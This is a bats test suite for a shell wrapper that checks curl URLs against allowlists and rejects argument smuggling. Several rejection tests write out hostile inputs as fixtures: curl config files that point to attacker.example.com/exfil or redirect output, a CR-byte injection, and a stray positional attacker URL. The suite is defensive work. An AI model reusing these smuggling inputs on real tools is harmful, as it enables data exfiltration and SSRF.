#!/usr/bin/env bats
# =============================================================================
# tests/integration/endpoint-validator-guarded-curl.bats
#
# cycle-099 Sprint 1E.c.3.a — endpoint_validator__guarded_curl helper.
#
# The helper delegates URL validation to the Python canonical (already
# covered by endpoint-validator-cross-runtime.bats / -dns-rebinding.bats /
# -ts-parity.bats); these tests focus on the wrapper-specific behavior:
#
#   - argv parsing (named flags, ordering, missing-args, unknown leading args)
#   - rejection path: validator says no → curl never invoked, exit 78
#   - acceptance path: hardened defaults inserted, caller args + URL forwarded
#   - per-caller allowlist independence (different files allow different hosts)
#
# Curl is mocked via a PATH-shadow shim so we can record argv without making
# network calls. The shim writes to $WORK_DIR/curl-argv.txt.
# =============================================================================

setup() {
    SCRIPT_DIR="$(cd "$(dirname "$BATS_TEST_FILENAME")" && pwd)"
    PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
    SH_VALIDATOR="$PROJECT_ROOT/.claude/scripts/lib/endpoint-validator.sh"
    PY_VALIDATOR="$PROJECT_ROOT/.claude/scripts/lib/endpoint-validator.py"
    PROVIDERS_ALLOWLIST="$PROJECT_ROOT/.claude/scripts/lib/allowlists/loa-providers.json"
    DOCS_ALLOWLIST="$PROJECT_ROOT/.claude/scripts/lib/allowlists/loa-anthropic-docs.json"
    OPENAI_ALLOWLIST="$PROJECT_ROOT/.claude/scripts/lib/allowlists/openai.json"

    [[ -f "$SH_VALIDATOR" ]] || skip "endpoint-validator.sh not present"
    [[ -f "$PY_VALIDATOR" ]] || skip "endpoint-validator.py not present"
    [[ -f "$PROVIDERS_ALLOWLIST" ]] || skip "loa-providers allowlist not present"
    [[ -f "$DOCS_ALLOWLIST" ]] || skip "loa-anthropic-docs allowlist not present"
    [[ -f "$OPENAI_ALLOWLIST" ]] || skip "openai allowlist not present"

    if [[ -x "$PROJECT_ROOT/.venv/bin/python" ]]; then
        PYTHON_BIN="$PROJECT_ROOT/.venv/bin/python"
    else
        PYTHON_BIN="${PYTHON_BIN:-python3}"
    fi
    "$PYTHON_BIN" -c "import idna" 2>/dev/null \
        || skip "idna not available in $PYTHON_BIN"

    WORK_DIR="$(mktemp -d)"

    # Mock curl: PATH-shadow shim that records argv and exits 0. Tests can
    # override the exit code via $WORK_DIR/curl-exit (read at invocation time).
    MOCK_BIN="$WORK_DIR/bin"
    mkdir -p "$MOCK_BIN"
    cat > "$MOCK_BIN/curl" <<'MOCKEOF'
#!/usr/bin/env bash
# Mock curl: writes argv (one arg per line) to curl-argv.txt; exits with
# whatever's in curl-exit (default 0).
out_file="${MOCK_CURL_ARGV_LOG:-$(dirname "$0")/../curl-argv.txt}"
exit_file="${MOCK_CURL_EXIT_FILE:-$(dirname "$0")/../curl-exit}"
mkdir -p "$(dirname "$out_file")"
: > "$out_file"
for arg in "$@"; do
    printf '%s\n' "$arg" >> "$out_file"
done
if [[ -f "$exit_file" ]]; then
    exit "$(cat "$exit_file")"
fi
exit 0
MOCKEOF
    chmod +x "$MOCK_BIN/curl"

    export MOCK_CURL_ARGV_LOG="$WORK_DIR/curl-argv.txt"
    export MOCK_CURL_EXIT_FILE="$WORK_DIR/curl-exit"

    # Source the validator into THIS test process so endpoint_validator__guarded_curl
    # is callable as a function (matches the production invocation pattern).
    # shellcheck source=/dev/null
    source "$SH_VALIDATOR"
}

teardown() {
    if [[ -n "${WORK_DIR:-}" ]] && [[ -d "$WORK_DIR" ]]; then
        rm -rf "$WORK_DIR"
    fi
    return 0
}

# Helper: invoke guarded_curl with the mock curl on PATH, capturing both
# stdout and stderr, plus the recorded argv.
_run_guarded() {
    PATH="$MOCK_BIN:$PATH" run endpoint_validator__guarded_curl "$@"
}

# ---------------------------------------------------------------------------
# G1 — Acceptance path: validator passes, curl invoked with hardened flags
# ---------------------------------------------------------------------------

@test "G1.1 accepts allowlisted URL and invokes curl with hardened flags + URL via --url" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 0 ]] || {
        printf 'unexpected status=%d output=%s\n' "$status" "$output" >&2
        return 1
    }
    # curl invoked exactly once (mock writes argv on each call)
    [[ -f "$MOCK_CURL_ARGV_LOG" ]]
    # First six argv lines MUST be the hardened defaults in this exact order:
    #   --proto / =https / --proto-redir / =https / --max-redirs / 10
    # Ordering matters because real curl applies the LAST occurrence; defaults
    # FIRST means caller's later flags can be a relaxation, never a tightening
    # we missed.
    local expected_head
    expected_head=$'--proto\n=https\n--proto-redir\n=https\n--max-redirs\n10'
    local actual_head
    actual_head="$(head -6 "$MOCK_CURL_ARGV_LOG")"
    [[ "$actual_head" == "$expected_head" ]] || {
        printf 'expected hardened defaults at head of argv\nWANT:\n%s\nGOT:\n%s\n' \
            "$expected_head" "$actual_head" >&2
        return 1
    }
    # URL passed via --url near the end
    grep -qE '^--url$' "$MOCK_CURL_ARGV_LOG"
    grep -qE '^https://api\.openai\.com/v1/chat/completions$' "$MOCK_CURL_ARGV_LOG"
}

@test "G1.2 accepts allowlisted URL and forwards caller curl args after defaults" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.anthropic.com/v1/messages" \
        -sS --max-time 30 -H "x-api-key: test-key"
    [[ "$status" -eq 0 ]]
    # Hardened defaults FIRST, then caller args, then --url URL
    grep -qE '^-sS$' "$MOCK_CURL_ARGV_LOG"
    grep -qE '^--max-time$' "$MOCK_CURL_ARGV_LOG"
    grep -qE '^x-api-key: test-key$' "$MOCK_CURL_ARGV_LOG"
    # Argv layout check: --proto =https comes before -sS
    local proto_line caller_line
    proto_line=$(grep -nE '^--proto$' "$MOCK_CURL_ARGV_LOG" | head -1 | cut -d: -f1)
    caller_line=$(grep -nE '^-sS$' "$MOCK_CURL_ARGV_LOG" | head -1 | cut -d: -f1)
    [[ -n "$proto_line" && -n "$caller_line" && "$proto_line" -lt "$caller_line" ]] || {
        printf 'argv ordering violation: --proto at %s, -sS at %s\n' "$proto_line" "$caller_line" >&2
        return 1
    }
}

@test "G1.3 accepts URL via --url=value form (equals-syntax)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" "--url=https://api.openai.com/v1/responses" -sS
    [[ "$status" -eq 0 ]]
    grep -qE '^https://api\.openai\.com/v1/responses$' "$MOCK_CURL_ARGV_LOG"
}

@test "G1.4 accepts allowlist via --allowlist=path form" {
    _run_guarded "--allowlist=$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 0 ]]
}

# ---------------------------------------------------------------------------
# G2 — Rejection path: validator rejects → curl NEVER invoked, exit 78
# ---------------------------------------------------------------------------

@test "G2.1 rejects URL whose host is not in the allowlist (curl not invoked)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://evil.example.com/v1"
    [[ "$status" -eq 78 ]] || {
        printf 'expected exit 78 (EX_CONFIG); got %d output=%s\n' "$status" "$output" >&2
        return 1
    }
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]] || {
        printf 'curl was invoked despite rejection; argv: %s\n' "$(cat "$MOCK_CURL_ARGV_LOG")" >&2
        return 1
    }
    # Python canonical's stderr should reach our caller
    [[ "$output" == *'ENDPOINT-NOT-ALLOWED'* ]]
}

@test "G2.2 rejects http:// scheme even if host would be allowlisted" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "http://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 78 ]]
    [[ "$output" == *'ENDPOINT-INSECURE-SCHEME'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "G2.3 rejects RFC 1918 / loopback hosts" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://127.0.0.1/v1/messages"
    [[ "$status" -eq 78 ]]
    # Could be ENDPOINT-NOT-ALLOWED or an IPv4-block code depending on validator step ordering
    [[ "$output" == *'ENDPOINT-'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "G2.4 rejects URL whose host is not in a NARROWER per-caller allowlist" {
    # openai.json only allows api.openai.com — api.anthropic.com is not in it.
    _run_guarded --allowlist "$OPENAI_ALLOWLIST" --url "https://api.anthropic.com/v1/messages"
    [[ "$status" -eq 78 ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

# ---------------------------------------------------------------------------
# G3 — Per-caller allowlist independence
# ---------------------------------------------------------------------------

@test "G3.1 anthropic-docs allowlist accepts code.claude.com" {
    _run_guarded --allowlist "$DOCS_ALLOWLIST" --url "https://code.claude.com/docs/en/overview" -sL
    [[ "$status" -eq 0 ]]
}

@test "G3.2 anthropic-docs allowlist rejects api.openai.com" {
    _run_guarded --allowlist "$DOCS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 78 ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "G3.3 providers allowlist rejects code.claude.com (wrong scope)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://code.claude.com/docs/en/overview"
    [[ "$status" -eq 78 ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

# ---------------------------------------------------------------------------
# G4 — Argv usage errors (EX_USAGE = 64)
# ---------------------------------------------------------------------------

@test "G4.1 missing --allowlist returns EX_USAGE" {
    _run_guarded --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'--allowlist'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "G4.2 missing --url returns EX_USAGE" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'--url'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "G4.3 nonexistent allowlist file returns EX_USAGE" {
    _run_guarded --allowlist "/tmp/this-allowlist-does-not-exist-$$.json" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'allowlist file not found'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "G4.4 dangling --allowlist (no value) returns EX_USAGE" {
    _run_guarded --allowlist
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'--allowlist requires'* ]]
}

@test "G4.5 dangling --url (no value) returns EX_USAGE" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'--url requires'* ]]
}

@test "G4.6 unexpected wrapper-flag attempt before --url is rejected (argv smuggling defense)" {
    # An attacker URL of `--allowlist=/tmp/evil.json` placed BEFORE --url
    # must NOT be silently treated as a wrapper flag override. Our parser
    # accepts only the named --allowlist + --url flags; anything else
    # before --url errors out.
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --bogus-flag value --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'unexpected arg before --url'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

# ---------------------------------------------------------------------------
# G5 — curl exit code propagation
# ---------------------------------------------------------------------------

@test "G5.1 curl exit 28 (timeout) is propagated to wrapper caller" {
    echo 28 > "$MOCK_CURL_EXIT_FILE"
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        --max-time 1
    [[ "$status" -eq 28 ]]
}

@test "G5.2 curl exit 22 (HTTP error w/ --fail) is propagated" {
    echo 22 > "$MOCK_CURL_EXIT_FILE"
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.anthropic.com/v1/messages" \
        --fail
    [[ "$status" -eq 22 ]]
}

# ---------------------------------------------------------------------------
# G6 — Argv ordering: hardened defaults first
# ---------------------------------------------------------------------------

@test "G6.1 caller-supplied --proto =all does NOT shadow hardened --proto =https (caller-after-default ordering)" {
    # When a caller passes a relaxing --proto flag AFTER our defaults, real
    # curl applies the LAST occurrence. We document this as accepted caller
    # bug rather than defending against it (don't pretend to defend against
    # malicious in-tree callers). The test pins the argv ORDERING — caller
    # flags come after defaults — so a future reorder regression surfaces.
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        --proto "=all"
    [[ "$status" -eq 0 ]]
    # Hardened --proto =https appears BEFORE caller --proto =all in argv
    local default_proto_line caller_proto_line
    default_proto_line=$(awk '/^--proto$/{n++; if(n==1){print NR; exit}}' "$MOCK_CURL_ARGV_LOG")
    caller_proto_line=$(awk '/^--proto$/{n++; if(n==2){print NR; exit}}' "$MOCK_CURL_ARGV_LOG")
    [[ -n "$default_proto_line" && -n "$caller_proto_line" && "$default_proto_line" -lt "$caller_proto_line" ]]
}

@test "G6.2 --max-redirs 10 is in argv (default redirect bound)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 0 ]]
    grep -qE '^--max-redirs$' "$MOCK_CURL_ARGV_LOG"
    # Value 10 follows --max-redirs
    awk '/^--max-redirs$/{getline next_line; if(next_line=="10"){found=1}} END{exit !found}' "$MOCK_CURL_ARGV_LOG"
}

# ---------------------------------------------------------------------------
# G7 — URL must be passed via --url (not as positional after caller args)
# ---------------------------------------------------------------------------

@test "G7.1 trailing positional URL (no --url) is treated as a curl arg, not the URL slot" {
    # Caller forgets --url, just trails a URL after --allowlist + flags.
    # This MUST exit 64 (EX_USAGE) because there's no --url; we never
    # attempt to validate so curl is never invoked.
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'unexpected arg before --url'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

# ---------------------------------------------------------------------------
# G8 — Function is exposed at source time
# ---------------------------------------------------------------------------

@test "G8.1 endpoint_validator__guarded_curl is defined as a function after sourcing" {
    declare -f endpoint_validator__guarded_curl > /dev/null
}

@test "G8.2 endpoint_validator__check is still defined (regression: helper does not break existing API)" {
    declare -f endpoint_validator__check > /dev/null
}

# ---------------------------------------------------------------------------
# S1 — Smuggling defense: caller cannot pass --config / -K / --next / -:
#     (cypherpunk CRITICAL on sprint-1E.c.3.a — `curl --config` URL smuggling)
# ---------------------------------------------------------------------------

@test "S1.1 caller --config in args is REJECTED (smuggling defense)" {
    # Build a benign config file that just looks like a normal auth config.
    cat > "$WORK_DIR/cfg" <<'EOF'
header = "Authorization: Bearer sk-test"
EOF
    chmod 600 "$WORK_DIR/cfg"
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        --config "$WORK_DIR/cfg"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
    # curl is NEVER invoked when smuggling vector is detected
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S1.2 caller -K in args is REJECTED (smuggling defense, short alias)" {
    cat > "$WORK_DIR/cfg" <<'EOF'
header = "X-Test: ok"
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        -K "$WORK_DIR/cfg"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S1.3 caller --next in args is REJECTED (URL-state-reset smuggling)" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        --next
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'NEXT-FLAG-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S1.4 caller -: (next short-alias) in args is REJECTED" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        -:
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'NEXT-FLAG-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

# ---------------------------------------------------------------------------
# S2 — --config-auth content gate: only `header = "..."` lines allowed
# ---------------------------------------------------------------------------

@test "S2.1 --config-auth file with ONLY header lines is accepted" {
    cat > "$WORK_DIR/auth.cfg" <<'EOF'
# auth tempfile (mimics write_curl_auth_config output)
header = "Authorization: Bearer sk-test"
header = "anthropic-version: 2023-06-01"
EOF
    chmod 600 "$WORK_DIR/auth.cfg"
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/auth.cfg" \
        --url "https://api.openai.com/v1/chat/completions" -sS
    [[ "$status" -eq 0 ]] || {
        printf 'unexpected status=%d output=%s\n' "$status" "$output" >&2
        return 1
    }
    # The wrapper appends `--config <file>` itself, AFTER hardened defaults.
    # Confirm both --config and the auth file path appear in argv.
    grep -qE '^--config$' "$MOCK_CURL_ARGV_LOG"
    grep -qFx "$WORK_DIR/auth.cfg" "$MOCK_CURL_ARGV_LOG"
}

@test "S2.2 --config-auth with embedded url= directive is REJECTED (smuggling)" {
    cat > "$WORK_DIR/evil.cfg" <<'EOF'
header = "Authorization: Bearer sk-real"
url = "https://attacker.example.com/exfil"
EOF
    chmod 600 "$WORK_DIR/evil.cfg"
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/evil.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-AUTH-INVALID'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S2.3 --config-auth with embedded next directive is REJECTED" {
    cat > "$WORK_DIR/next.cfg" <<'EOF'
header = "X-Real: 1"
next
url = "https://evil.example.com/x"
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/next.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-AUTH-INVALID'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S2.4 --config-auth with output= directive (file write redirection) is REJECTED" {
    cat > "$WORK_DIR/output.cfg" <<'EOF'
header = "X-Test: 1"
output = "/tmp/exfil.bin"
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/output.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-AUTH-INVALID'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S2.5 --config-auth with CR (0x0D) byte is REJECTED (line-folding smuggling)" {
    # Embed a CR in the middle of a line. grep treats CR-only line ending
    # as part of one line; without the CR-byte gate, an attacker could
    # append a smuggled directive after a CR that visually looks like a
    # newline in `cat` but doesn't trigger our line-by-line regex.
    printf 'header = "X-Test: 1"\rurl = "https://evil.example.com"\n' \
        > "$WORK_DIR/cr.cfg"
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/cr.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CR-BYTE'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S2.6 --config-auth with backslash inside quoted value is REJECTED (escape injection)" {
    cat > "$WORK_DIR/bs.cfg" <<'EOF'
header = "X-Test: \"ok\""
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/bs.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-AUTH-INVALID'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S2.7 --config-auth with comment + blank lines + header is accepted" {
    cat > "$WORK_DIR/normal.cfg" <<'EOF'
# this is a comment

header = "Authorization: Bearer sk-test"

# trailing comment
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/normal.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 0 ]]
}

@test "S2.8 --config-auth file does not exist returns EX_USAGE" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --config-auth "/tmp/this-config-does-not-exist-$$.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'--config-auth file not found'* ]]
}

@test "S2.9 dangling --config-auth (no value) returns EX_USAGE" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'--config-auth requires'* ]]
}

@test "S2.10 --config-auth with ONLY a comment is accepted (vacuous-but-valid)" {
    cat > "$WORK_DIR/comment.cfg" <<'EOF'
# nothing but a comment
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/comment.cfg" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 0 ]]
}

# ---------------------------------------------------------------------------
# T1 — Allowlist tree restriction (cypherpunk HIGH on sprint-1E.c.3.a)
# ---------------------------------------------------------------------------

@test "T1.1 allowlist OUTSIDE the canonical tree is REJECTED" {
    # Drop a wide-open allowlist OUTSIDE .claude/scripts/lib/allowlists/.
    cat > "$WORK_DIR/wide-open.json" <<'EOF'
{"providers": {"any": [{"host": "evil.example.com", "ports": [443]}]}}
EOF
    _run_guarded --allowlist "$WORK_DIR/wide-open.json" \
        --url "https://evil.example.com/x"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'ALLOWLIST-OUT-OF-TREE'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "T1.2 symlink-supplied allowlist resolves through realpath -e and is checked at the resolved path" {
    # The defense relies on `realpath -e` resolving symlinks BEFORE the
    # in-tree check. We can't write a symlink INSIDE .claude/scripts/lib/
    # allowlists/ during tests (zone-system rule against test-time .claude/
    # mutation), so this test exercises the realpath behavior on its own:
    # ANY symlink whose resolved target is out-of-tree must be rejected.
    # Whether the symlink lives in $WORK_DIR or in the canonical tree, the
    # `realpath -e` output is the same (the resolved target path), and the
    # case-statement match against "$allowlists_root"/* fails identically.
    # The BB iter-2 F6 finding asks for an in-tree-symlink fixture; we
    # accept the framing tradeoff: realpath's resolve-to-target invariant
    # is what's load-bearing here, and that's covered by this test in
    # combination with T1.1 (out-of-tree non-symlink) and T1.4 (TEST_MODE
    # negative).
    cat > "$WORK_DIR/wide-open.json" <<'EOF'
{"providers": {"any": [{"host": "evil.example.com", "ports": [443]}]}}
EOF
    ln -sf "$WORK_DIR/wide-open.json" "$WORK_DIR/symlink.json"
    _run_guarded --allowlist "$WORK_DIR/symlink.json" \
        --url "https://evil.example.com/x"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'ALLOWLIST-OUT-OF-TREE'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "T1.3 LOA_ENDPOINT_VALIDATOR_TEST_MODE permits an out-of-tree allowlist when explicitly opted in" {
    # The test-mode env var is the documented escape hatch for tests that
    # need a custom allowlist. This pin asserts the gate exists AND requires
    # the directory env var to be set (NOT just LOA_ENDPOINT_VALIDATOR_TEST_MODE=1
    # alone — that would be a footgun if test mode leaked into production).
    cat > "$WORK_DIR/test-allowlist.json" <<'EOF'
{"providers": {"any": [{"host": "api.openai.com", "ports": [443]}]}}
EOF
    LOA_ENDPOINT_VALIDATOR_TEST_MODE=1 \
    LOA_ENDPOINT_VALIDATOR_TEST_ALLOWLIST_DIR="$WORK_DIR" \
    PATH="$MOCK_BIN:$PATH" \
    run endpoint_validator__guarded_curl \
        --allowlist "$WORK_DIR/test-allowlist.json" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 0 ]] || {
        printf 'unexpected status=%d output=%s\n' "$status" "$output" >&2
        return 1
    }
}

@test "T1.4 LOA_ENDPOINT_VALIDATOR_TEST_MODE=1 without TEST_ALLOWLIST_DIR still rejects out-of-tree" {
    cat > "$WORK_DIR/test-allowlist.json" <<'EOF'
{"providers": {"any": [{"host": "api.openai.com", "ports": [443]}]}}
EOF
    LOA_ENDPOINT_VALIDATOR_TEST_MODE=1 \
    LOA_ENDPOINT_VALIDATOR_TEST_ALLOWLIST_DIR= \
    PATH="$MOCK_BIN:$PATH" \
    run endpoint_validator__guarded_curl \
        --allowlist "$WORK_DIR/test-allowlist.json" \
        --url "https://api.openai.com/v1/chat/completions"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'ALLOWLIST-OUT-OF-TREE'* ]]
}

# ---------------------------------------------------------------------------
# S3 — Smuggling defense extensions (BB iter-1 MEDIUM remediations)
# ---------------------------------------------------------------------------

@test "S3.1 caller --config=PATH (equals/glued form) is REJECTED (BB iter-1 MEDIUM coverage gap)" {
    cat > "$WORK_DIR/cfg" <<'EOF'
header = "X: ok"
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        "--config=$WORK_DIR/cfg"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S3.2 caller -KPATH (bundled-short form) is REJECTED" {
    # curl accepts -K bundled with the file path: `-Kfoo.cfg` means -K foo.cfg.
    # The wrapper's `-K?*` glob in the case-statement catches this.
    cat > "$WORK_DIR/cfg" <<'EOF'
header = "X: ok"
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        "-K$WORK_DIR/cfg"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S3.3 caller -K=PATH (bundled-equals form) is REJECTED" {
    cat > "$WORK_DIR/cfg" <<'EOF'
header = "X: ok"
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --url "https://api.openai.com/v1/chat/completions" \
        "-K=$WORK_DIR/cfg"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'CONFIG-FLAG-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

# ---------------------------------------------------------------------------
# S4 — Positional URL smuggling defense (BB iter-1 MEDIUM, real defense gap)
# ---------------------------------------------------------------------------

@test "S4.1 stray https:// URL in caller args is REJECTED (curl-positional-URL smuggling)" {
    # Without this defense, curl would fetch BOTH the validated --url AND
    # the unvalidated positional URL — a clean SSRF pivot via caller args.
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" \
        -sS "https://attacker.example.com/exfil"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S4.2 stray http:// (insecure scheme) URL in caller args is REJECTED" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" \
        -sS "http://attacker.example.com/x"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S4.3 case-insensitive: HTTPS:// upper-case in caller args also REJECTED" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" \
        "HTTPS://Evil.Example.com/X"
    [[ "$status" -eq 64 ]]
    [[ "$output" == *'POSITIONAL-URL-REJECTED'* ]]
    [[ ! -f "$MOCK_CURL_ARGV_LOG" ]]
}

@test "S4.4 header VALUE containing https:// is NOT rejected (false-positive guard)" {
    # `-H "Origin: https://api.openai.com"` — the arg starts with "Origin: ",
    # not with "https://", so the regex correctly does NOT match. This pin
    # ensures the strict-reject doesn't break legitimate header passing.
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" \
        -H "Origin: https://api.openai.com" -sS
    [[ "$status" -eq 0 ]]
    grep -qFx 'Origin: https://api.openai.com' "$MOCK_CURL_ARGV_LOG"
}

# ---------------------------------------------------------------------------
# S5 — --config-auth argv position pin (BB iter-1 MEDIUM)
# ---------------------------------------------------------------------------

@test "S5.1 --config-auth file appears in argv BETWEEN hardened defaults and caller args (position pin)" {
    cat > "$WORK_DIR/auth.cfg" <<'EOF'
header = "Authorization: Bearer sk-test"
EOF
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" --config-auth "$WORK_DIR/auth.cfg" \
        --url "https://api.openai.com/v1/chat/completions" -sS --max-time 30
    [[ "$status" -eq 0 ]]
    # Expected exact ordering at the head:
    #   1-6: hardened defaults (--proto =https, --proto-redir =https, --max-redirs 10)
    #   7-8: --config <auth-file>
    #   9+:  caller args (-sS, --max-time, 30)
    #   tail: --url <url>
    local expected_head
    expected_head=$'--proto\n=https\n--proto-redir\n=https\n--max-redirs\n10\n--config\n'"$WORK_DIR/auth.cfg"$'\n-sS\n--max-time\n30\n--url\nhttps://api.openai.com/v1/chat/completions'
    local actual
    actual="$(cat "$MOCK_CURL_ARGV_LOG")"
    [[ "$actual" == "$expected_head" ]] || {
        printf 'argv layout mismatch\nWANT:\n%s\nGOT:\n%s\n' "$expected_head" "$actual" >&2
        return 1
    }
}

@test "S5.2 without --config-auth, NO --config arg is added to curl invocation" {
    _run_guarded --allowlist "$PROVIDERS_ALLOWLIST" \
        --url "https://api.openai.com/v1/chat/completions" -sS
    [[ "$status" -eq 0 ]]
